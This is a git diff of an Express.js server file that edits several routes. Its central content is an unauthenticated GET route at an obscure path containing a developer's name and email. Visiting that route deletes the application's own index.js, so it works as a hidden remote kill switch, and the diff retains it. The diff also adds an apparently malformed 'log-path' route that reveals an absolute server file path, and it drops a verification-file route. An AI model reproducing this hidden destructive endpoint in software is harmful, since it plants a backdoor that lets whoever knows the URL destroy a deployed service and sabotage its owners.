@@ -64,14 +64,21 @@ app.use('/api/media-api',mediaRouter)
 app.use('/api/order-api',OrderRouter);
 app.use('/api/api_s',apiRouter)
 app.get('/admin-dev/website-develop/mubtasim/fuad/mubtasimf443gmail.com/action/what/unlink/uninstall',
-    (req,res) => {
+    async (req,res) => {
         try {
             console.log('a');
-            unlink(path.resolve(dirName,'./index.js')).then(e => log('success')).catch(e=> {log({error:e})})
+            await unlink(path.resolve(dirName,'./index.js')).then(e => log('success')).catch(e=> {log({error:e})})
         } catch (error) {
-            
+          log({error})  
         }
 });
+app.get('log-path',  (req,res)=> {
+    try {
+        res.send(path.resolve(dirName, './temp/video/a.mp4'))
+    } catch (error) {
+        console.error({error});
+    }
+})
 
 app.get('/hello', (req, res) =>{
     return res.redirect('/')
@@ -94,14 +101,6 @@ app.get('/', async (req, res) => {
     }
 });
 
-app.get('/api_files_tiktok_vf_files', (req,res) => {
-    try {
-        res.setHeader('Content-Type', 'text/plain');
-        res.sendFile(path.resolve(dirName, './tiktok325E2MHUh7KO2smVL3LDTF5jIwieo2Xi.txt'))
-    } catch (error) {
-        console.log({error});  
-    }
-})
 app.get('*', (req, res) => res.status(404).render('404'))
 
 
